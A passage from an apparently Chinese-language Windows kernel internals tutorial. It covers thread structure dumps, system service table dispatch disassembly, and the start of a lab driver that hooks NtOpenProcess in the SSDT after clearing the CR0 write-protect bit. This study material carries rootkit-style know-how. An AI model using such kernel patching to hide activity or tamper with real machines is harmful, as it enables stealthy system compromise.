class="token number">5</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> BreakOnTermination <span class="token operator">:</span> Pos <span class="token number">6</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> SkipCreationMsg  <span class="token operator">:</span> Pos <span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x248</span> SkipTerminationMsg <span class="token operator">:</span> Pos <span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x24c</span> SameThreadPassiveFlags <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x24c</span> ActiveExWorker   <span class="token operator">:</span> Pos <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x24c</span> ExWorkerCanWaitUser <span class="token operator">:</span> Pos <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x24c</span> MemoryMaker      <span class="token operator">:</span> Pos <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x250</span> SameThreadApcFlags <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x250</span> LpcReceivedMsgIdValid <span class="token operator">:</span> Pos <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x250</span> LpcExitThreadCalled <span class="token operator">:</span> Pos <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x250</span> AddressSpaceOwner <span class="token operator">:</span> Pos <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">1</span> Bit   <span class="token operator">+</span><span class="token number">0x254</span> ForwardClusterOnly <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x255</span> DisablePageFaultClustering <span class="token operator">:</span> UChar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="KTHREAD"><a href="#KTHREAD" class="headerlink" title="KTHREAD"></a>KTHREAD</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">kd<span class="token operator">></span> dt _KTHREADnt<span class="token operator">!</span>_KTHREAD   <span class="token operator">+</span><span class="token number">0x000</span> Header           <span class="token operator">:</span> _DISPATCHER_HEADER   <span class="token operator">+</span><span class="token number">0x010</span> MutantListHead   <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x018</span> InitialStack     <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x01c</span> StackLimit       <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x020</span> Teb              <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x024</span> TlsArray         <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x028</span> KernelStack      <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x02c</span> DebugActive      <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x02d</span> State            <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x02e</span> Alerted          <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x030</span> Iopl             <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x031</span> NpxState         <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x032</span> Saturation       <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x033</span> Priority         <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x034</span> ApcState         <span class="token operator">:</span> _KAPC_STATE   <span class="token operator">+</span><span class="token number">0x04c</span> ContextSwitches  <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x050</span> IdleSwapBlock    <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x051</span> Spare0           <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> UChar   <span class="token operator">+</span><span class="token number">0x054</span> WaitStatus       <span class="token operator">:</span> Int4B   <span class="token operator">+</span><span class="token number">0x058</span> WaitIrql         <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x059</span> WaitMode         <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x05a</span> WaitNext         <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x05b</span> WaitReason       <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x05c</span> WaitBlockList    <span class="token operator">:</span> Ptr32 _KWAIT_BLOCK   <span class="token operator">+</span><span class="token number">0x060</span> WaitListEntry    <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x060</span> SwapListEntry    <span class="token operator">:</span> _SINGLE_LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x068</span> WaitTime         <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x06c</span> BasePriority     <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x06d</span> DecrementCount   <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x06e</span> PriorityDecrement <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x06f</span> Quantum          <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x070</span> WaitBlock        <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> _KWAIT_BLOCK   <span class="token operator">+</span><span class="token number">0x0d0</span> LegoData         <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x0d4</span> KernelApcDisable <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0d8</span> UserAffinity     <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0dc</span> SystemAffinityActive <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x0dd</span> PowerState       <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x0de</span> NpxIrql          <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x0df</span> InitialNode      <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x0e0</span> ServiceTable     <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x0e4</span> Queue            <span class="token operator">:</span> Ptr32 _KQUEUE   <span class="token operator">+</span><span class="token number">0x0e8</span> ApcQueueLock     <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x0f0</span> Timer            <span class="token operator">:</span> _KTIMER   <span class="token operator">+</span><span class="token number">0x118</span> QueueListEntry   <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x120</span> SoftAffinity     <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x124</span> Affinity         <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x128</span> Preempted        <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x129</span> ProcessReadyQueue <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x12a</span> KernelStackResident <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x12b</span> NextProcessor    <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x12c</span> CallbackStack    <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x130</span> Win32Thread      <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x134</span> TrapFrame        <span class="token operator">:</span> Ptr32 _KTRAP_FRAME   <span class="token operator">+</span><span class="token number">0x138</span> ApcStatePointer  <span class="token operator">:</span> <span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> Ptr32 _KAPC_STATE   <span class="token operator">+</span><span class="token number">0x140</span> PreviousMode     <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x141</span> EnableStackSwap  <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x142</span> LargeStack       <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x143</span> ResourceIndex    <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x144</span> KernelTime       <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x148</span> UserTime         <span class="token operator">:</span> Uint4B   <span class="token operator">+</span><span class="token number">0x14c</span> SavedApcState    <span class="token operator">:</span> _KAPC_STATE   <span class="token operator">+</span><span class="token number">0x164</span> Alertable        <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x165</span> ApcStateIndex    <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x166</span> ApcQueueable     <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x167</span> AutoAlignment    <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x168</span> StackBase        <span class="token operator">:</span> Ptr32 Void   <span class="token operator">+</span><span class="token number">0x16c</span> SuspendApc       <span class="token operator">:</span> _KAPC   <span class="token operator">+</span><span class="token number">0x19c</span> SuspendSemaphore <span class="token operator">:</span> _KSEMAPHORE   <span class="token operator">+</span><span class="token number">0x1b0</span> ThreadListEntry  <span class="token operator">:</span> _LIST_ENTRY   <span class="token operator">+</span><span class="token number">0x1b8</span> FreezeCount      <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x1b9</span> SuspendCount     <span class="token operator">:</span> Char   <span class="token operator">+</span><span class="token number">0x1ba</span> IdealProcessor   <span class="token operator">:</span> UChar   <span class="token operator">+</span><span class="token number">0x1bb</span> DisableBoost     <span class="token operator">:</span> UChar<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="SST"><a href="#SST" class="headerlink" title="SST"></a>SST</h4><p>Windows中的系统服务表（System Service Table）有两个，第一个是内核中的核心函数导出表，第二个是GUI相关的函数非导出表：<br><img src="/images/3-11.png" alt="3-11"></p><h4 id="SSDT"><a href="#SSDT" class="headerlink" title="SSDT"></a>SSDT</h4><p>SSDT中一共包含4个STT，只有前两个是有效的。</p><h3 id="3-3-0环调用"><a href="#3-3-0环调用" class="headerlink" title="3.3 0环调用"></a>3.3 0环调用</h3><h4 id="KiSystemService"><a href="#KiSystemService" class="headerlink" title="KiSystemService"></a>KiSystemService</h4><p>中断门进0环后调用：</p><pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">push    <span class="token number">0</span>push    <span class="token register variable">ebp</span>             <span class="token comment">; 从Trap Frame+0x64开始，依次压入：</span>                        <span class="token comment">; Errcode, EBP, EBX, ESI, EDI, 标志寄存器</span>push    <span class="token register variable">ebx</span>push    <span class="token register variable">esi</span>push    <span class="token register variable">edi</span>push    <span class="token register variable">fs</span>mov     <span class="token register variable">ebx</span>, <span class="token number">30h</span> <span class="token comment">; '0'  ; 更改fs，使其指向KPCR</span>mov     <span class="token register variable">fs</span>, <span class="token register variable">bx</span>assume <span class="token register variable">fs</span>:nothingpush    dword ptr <span class="token register variable">ds</span>:<span class="token number">0FFDFF000h</span> <span class="token comment">; 压入KPCR中的第一个字段作为ExceptionList</span>mov     dword ptr <span class="token register variable">ds</span>:<span class="token number">0FFDFF000h</span>, <span class="token number">0FFFFFFFFh</span> <span class="token comment">; 将 ExceptionList 置为 -1</span>mov     <span class="token register variable">esi</span>, <span class="token register variable">ds</span>:<span class="token number">0FFDFF124h</span> <span class="token comment">; 获得_KPRCB中的CurrentThread字段</span>push    dword ptr <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">140h</span><span class="token operator">]</span> <span class="token comment">; 压入_KTHREAD中的PreviousMode字段，0环调用为0，3环为1</span>sub     <span class="token register variable">esp</span>, <span class="token number">48h</span>        <span class="token comment">; 抬栈，ESP指向栈帧开头</span>mov     <span class="token register variable">ebx</span>, <span class="token operator">[</span><span class="token register variable">esp</span><span class="token operator">+</span><span class="token number">68h</span><span class="token operator">+</span>arg_0<span class="token operator">]</span> <span class="token comment">; 获取栈帧中保存的CS</span>and     <span class="token register variable">ebx</span>, <span class="token number">1</span>          <span class="token comment">; 判断是否0环权限</span>mov     <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">140h</span><span class="token operator">]</span>, <span class="token register variable">bl</span>  <span class="token comment">; 结果放入当前进程的PreviousMode中</span>mov     <span class="token register variable">ebp</span>, <span class="token register variable">esp</span>mov     <span class="token register variable">ebx</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">134h</span><span class="token operator">]</span> <span class="token comment">; 获取当前进程的栈帧</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span><span class="token number">3Ch</span><span class="token operator">]</span>, <span class="token register variable">ebx</span>  <span class="token comment">; 将栈帧中的EDX的值赋予当前进程的栈帧地址</span>mov     <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">134h</span><span class="token operator">]</span>, <span class="token register variable">ebp</span> <span class="token comment">; 将当前进程的栈帧替换为上面构造的新栈帧</span>cldmov     <span class="token register variable">ebx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span><span class="token number">60h</span><span class="token operator">]</span>  <span class="token comment">; 获取3环EBP</span>mov     <span class="token register variable">edi</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span><span class="token number">68h</span><span class="token operator">]</span>  <span class="token comment">; 获取3环EIP</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span><span class="token number">0Ch</span><span class="token operator">]</span>, <span class="token register variable">edx</span>  <span class="token comment">; 将 3环 的参数列表存入到 DbgArgPointer</span>mov     dword ptr <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">]</span>, <span class="token number">0BADB0D00h</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">]</span>, <span class="token register variable">ebx</span>    <span class="token comment">; 赋值DbgEBP,DbgEIP</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">]</span>, <span class="token register variable">edi</span>test    byte ptr <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">2Ch</span><span class="token operator">]</span>, <span class="token number">0FFh</span> <span class="token comment">; 检测当前进程的DebugActive</span>jnz     Dr_kss_a        <span class="token comment">; 如果被调试，则跳转</span><span class="token label function">loc_8053E4EF:</span>stijmp     loc_8053E5CD    <span class="token comment">; 跳转继续执行</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="KiFastCallEntry"><a href="#KiFastCallEntry" class="headerlink" title="KiFastCallEntry"></a>KiFastCallEntry</h4><p>sysenter进0环后调用：</p><pre class="line-numbers language-nasm" data-language="nasm"><code class="language-nasm">mov     <span class="token register variable">ecx</span>, <span class="token number">23h</span> <span class="token comment">; '#'</span>push    <span class="token number">30h</span> <span class="token comment">; '0'       ; 切换fs</span>pop     <span class="token register variable">fs</span>mov     <span class="token register variable">ds</span>, <span class="token register variable">ecx</span>         <span class="token comment">; 加载ds和es</span>mov     <span class="token register variable">es</span>, <span class="token register variable">ecx</span>mov     <span class="token register variable">ecx</span>, <span class="token register variable">ds</span>:<span class="token number">0FFDFF040h</span> <span class="token comment">; 获取KPCR中的TSS</span>mov     <span class="token register variable">esp</span>, <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">]</span>    <span class="token comment">; 获取0环ESP</span>push    <span class="token number">23h</span> <span class="token comment">; '#'       ; 依次压入HardwareSS,HardwareESP,EFlags</span>push    <span class="token register variable">edx</span>pushf<span class="token label function">loc_8053E55A:</span>           <span class="token comment">; 更新EFlags</span>push    <span class="token number">2</span>add     <span class="token register variable">edx</span>, <span class="token number">8</span>          <span class="token comment">; 获取到真正的函数参数地址</span>popfor      <span class="token operator">[</span><span class="token register variable">esp</span><span class="token operator">+</span><span class="token number">0Ch</span><span class="token operator">+</span>var_B<span class="token operator">]</span>, <span class="token number">2</span> <span class="token comment">; 设置栈帧中的EFlags？</span>push    <span class="token number">1Bh</span>             <span class="token comment">; 依次压入CS, EIP, ...</span>push    dword ptr <span class="token register variable">ds</span>:<span class="token number">0FFDF0304h</span>push    <span class="token number">0</span>push    <span class="token register variable">ebp</span>push    <span class="token register variable">ebx</span>push    <span class="token register variable">esi</span>push    <span class="token register variable">edi</span>mov     <span class="token register variable">ebx</span>, <span class="token register variable">ds</span>:<span class="token number">0FFDFF01Ch</span> <span class="token comment">; 获取KPCR</span>push    <span class="token number">3Bh</span> <span class="token comment">; ';'       ; 压入FS</span>mov     <span class="token register variable">esi</span>, <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">+</span><span class="token number">124h</span><span class="token operator">]</span> <span class="token comment">; 获取CurrentThread</span>push    dword ptr <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">]</span> <span class="token comment">; 压入ExceptionList</span>mov     dword ptr <span class="token operator">[</span><span class="token register variable">ebx</span><span class="token operator">]</span>, <span class="token number">0FFFFFFFFh</span> <span class="token comment">; 赋值ExceptionList为-1</span>mov     <span class="token register variable">ebp</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">18h</span><span class="token operator">]</span>  <span class="token comment">; 获取当前进程的栈帧</span>push    <span class="token number">1</span>sub     <span class="token register variable">esp</span>, <span class="token number">48h</span>        <span class="token comment">; 抬栈，指向新的栈帧开头</span>sub     <span class="token register variable">ebp</span>, <span class="token number">29Ch</span>mov     byte ptr <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">140h</span><span class="token operator">]</span>, <span class="token number">1</span> <span class="token comment">; 赋值当前进程中的PreviousMode</span>cmp     <span class="token register variable">ebp</span>, <span class="token register variable">esp</span>        <span class="token comment">; 判断是否为VX86线程</span>jnz     short loc_8053E53C<span class="token label function">loc_8053E53C:</span>jmp     short loc_8053E519<span class="token comment">; END OF FUNCTION CHUNK FOR _KiFastCallEntry</span>and     dword ptr <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span><span class="token number">2Ch</span><span class="token operator">]</span>, <span class="token number">0</span> <span class="token comment">; DR7</span>test    byte ptr <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">2Ch</span><span class="token operator">]</span>, <span class="token number">0FFh</span> <span class="token comment">; DebugActive</span>mov     <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">134h</span><span class="token operator">]</span>, <span class="token register variable">ebp</span> <span class="token comment">; 替换栈帧</span>jnz     Dr_FastCallDrSave<span class="token label function">loc_8053E5B6:</span>           <span class="token comment">; Debug相关</span>mov     <span class="token register variable">ebx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span><span class="token number">60h</span><span class="token operator">]</span>mov     <span class="token register variable">edi</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span><span class="token number">68h</span><span class="token operator">]</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span><span class="token number">0Ch</span><span class="token operator">]</span>, <span class="token register variable">edx</span>mov     dword ptr <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">]</span>, <span class="token number">0BADB0D00h</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span><span class="token number">0</span><span class="token operator">]</span>, <span class="token register variable">ebx</span>mov     <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span><span class="token number">4</span><span class="token operator">]</span>, <span class="token register variable">edi</span>sti<span class="token label function">loc_8053E5CD:</span>           <span class="token comment">; KiFastCallEntry和KiSystemService的共同调用部分</span>mov     <span class="token register variable">edi</span>, <span class="token register variable">eax</span>        <span class="token comment">; 获取3环传入的服务号</span>shr     <span class="token register variable">edi</span>, <span class="token number">8</span>and     <span class="token register variable">edi</span>, <span class="token number">30h</span>mov     <span class="token register variable">ecx</span>, <span class="token register variable">edi</span>add     <span class="token register variable">edi</span>, <span class="token operator">[</span><span class="token register variable">esi</span><span class="token operator">+</span><span class="token number">0E0h</span><span class="token operator">]</span> <span class="token comment">; 加上SST的基址</span>mov     <span class="token register variable">ebx</span>, <span class="token register variable">eax</span>and     <span class="token register variable">eax</span>, <span class="token number">0FFFh</span>      <span class="token comment">; 判断是否越界</span>cmp     <span class="token register variable">eax</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">8</span><span class="token operator">]</span>jnb     _KiBBTUnexpectedRangecmp     <span class="token register variable">ecx</span>, <span class="token number">10h</span>        <span class="token comment">; 判断是否是第2个SST中的函数</span>jnz     short loc_8053E60C <span class="token label function">loc_8053E60C:</span>           <span class="token comment">; KeSystemCalls 自增 1</span>inc     dword ptr <span class="token register variable">ds</span>:<span class="token number">0FFDFF638h</span>mov     <span class="token register variable">esi</span>, <span class="token register variable">edx</span>        <span class="token comment">; 获取参数地址</span>mov     <span class="token register variable">ebx</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token number">0Ch</span><span class="token operator">]</span>  <span class="token comment">; 获取SSDT参数表地址</span>xor     <span class="token register variable">ecx</span>, <span class="token register variable">ecx</span>mov     <span class="token register variable">cl</span>, <span class="token operator">[</span><span class="token register variable">eax</span><span class="token operator">+</span><span class="token register variable">ebx</span><span class="token operator">]</span>   <span class="token comment">; 获取参数长度</span>mov     <span class="token register variable">edi</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">]</span>      <span class="token comment">; 获取函数地址表</span>mov     <span class="token register variable">ebx</span>, <span class="token operator">[</span><span class="token register variable">edi</span><span class="token operator">+</span><span class="token register variable">eax</span><span class="token operator">*</span><span class="token number">4</span><span class="token operator">]</span> <span class="token comment">; 获取对应的函数</span>sub     <span class="token register variable">esp</span>, <span class="token register variable">ecx</span>        <span class="token comment">; 抬栈</span>shr     <span class="token register variable">ecx</span>, <span class="token number">2</span>mov     <span class="token register variable">edi</span>, <span class="token register variable">esp</span>cmp     <span class="token register variable">esi</span>, <span class="token register variable">ds</span>:_MmUserProbeAddress <span class="token comment">; 判断拷贝的源地址是否超出用户态能读取的宽度</span>jnb     loc_8053E7DC<span class="token label function">loc_8053E634:</span>           <span class="token comment">; 将参数从3环拷贝到0环</span>rep movsdcall    <span class="token register variable">ebx</span>             <span class="token comment">; 函数调用！</span><span class="token label function">loc_8053E638:</span>mov     <span class="token register variable">esp</span>, <span class="token register variable">ebp</span><span class="token label function">loc_8053E63A:</span>mov     <span class="token register variable">ecx</span>, <span class="token register variable">ds</span>:<span class="token number">0FFDFF124h</span>mov     <span class="token register variable">edx</span>, <span class="token operator">[</span><span class="token register variable">ebp</span><span class="token operator">+</span><span class="token number">3Ch</span><span class="token operator">]</span>mov     <span class="token operator">[</span><span class="token register variable">ecx</span><span class="token operator">+</span><span class="token number">134h</span><span class="token operator">]</span>, <span class="token register variable">edx</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="3-4-实验6：驱动实现-SSDT-Hook"><a href="#3-4-实验6：驱动实现-SSDT-Hook" class="headerlink" title="3.4 实验6：驱动实现 SSDT Hook"></a>3.4 实验6：驱动实现 SSDT Hook</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ntddk.h></span>    </span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ntstatus.h></span></span>ULONG OriginNtOpenProcess<span class="token punctuation">;</span><span class="token keyword">typedef</span> <span class="token function">NTSTATUS</span><span class="token punctuation">(</span><span class="token operator">*</span>NTOPENPROCESS<span class="token punctuation">)</span><span class="token punctuation">(</span>    PHANDLE ProcessHandle<span class="token punctuation">,</span>    ACCESS_MASK DesiredAccess<span class="token punctuation">,</span>    POBJECT_ATTRIBUTES ObjectAttributes<span class="token punctuation">,</span>    PCLIENT_ID ClientId<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// SST</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_KSYSTEM_SERVICE_TABLE</span><span class="token punctuation">&#123;</span>    PULONG  ServiceTableBase<span class="token punctuation">;</span><span class="token comment">// 服务函数地址表基址  </span>    PULONG  ServiceCounterTableBase<span class="token punctuation">;</span><span class="token comment">// SSDT函数被调用的次数</span>    ULONG   NumberOfService<span class="token punctuation">;</span><span class="token comment">// 服务函数的个数  </span>    PULONG   ParamTableBase<span class="token punctuation">;</span><span class="token comment">// 服务函数参数表基址   </span><span class="token punctuation">&#125;</span> KSYSTEM_SERVICE_TABLE<span class="token punctuation">,</span> <span class="token operator">*</span> PKSYSTEM_SERVICE_TABLE<span class="token punctuation">;</span><span class="token comment">// SSDT</span><span class="token keyword">typedef</span> <span class="token keyword">struct</span> <span class="token class-name">_KSERVICE_TABLE_DESCRIPTOR</span><span class="token punctuation">&#123;</span>    KSYSTEM_SERVICE_TABLE   ntoskrnl<span class="token punctuation">;</span><span class="token comment">// ntoskrnl.exe 的服务函数  </span>    KSYSTEM_SERVICE_TABLE   win32k<span class="token punctuation">;</span><span class="token comment">// win32k.sys 的服务函数(GDI32.dll/User32.dll 的内核支持)  </span>    KSYSTEM_SERVICE_TABLE   notUsed1<span class="token punctuation">;</span>    KSYSTEM_SERVICE_TABLE   notUsed2<span class="token punctuation">;</span><span class="token punctuation">&#125;</span>KSERVICE_TABLE_DESCRIPTOR<span class="token punctuation">,</span> <span class="token operator">*</span> PKSERVICE_TABLE_DESCRIPTOR<span class="token punctuation">;</span><span class="token keyword">extern</span> PKSERVICE_TABLE_DESCRIPTOR KeServiceDescriptorTable<span class="token punctuation">;</span> <span class="token comment">// SSDT</span><span class="token comment">// 开启写保护</span>VOID <span class="token function">PageProtectOn</span><span class="token punctuation">(</span>VOID<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    __asm <span class="token punctuation">&#123;</span>        mov  eax<span class="token punctuation">,</span> cr0        or eax<span class="token punctuation">,</span> <span class="token number">10000</span>h        mov  cr0<span class="token punctuation">,</span> eax        sti    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// 关闭写保护</span>VOID <span class="token function">PageProtectOff</span><span class="token punctuation">(</span>VOID<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    __asm <span class="token punctuation">&#123;</span>        cli        mov  eax<span class="token punctuation">,</span> cr0        and eax<span class="token punctuation">,</span> not <span class="token number">10000</span>h        mov  cr0<span class="token punctuation">,</span> eax    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token comment">// Hook函数</span>NTSTATUS <span class="token function">Hook</span><span class="token punctuation">(</span>    PHANDLE ProcessHandle<span class="token punctuation">,</span>    ACCESS_MASK DesiredAccess<span class="token punctuation">,</span>    POBJECT_ATTRIBUTES ObjectAttributes<span class="token punctuation">,</span>    PCLIENT_ID ClientId<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">DbgPrint</span><span class="token punctuation">(</span><span class="token string">"Hooked!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>NTOPENPROCESS<span class="token punctuation">)</span>OriginNtOpenProcess<span class="token 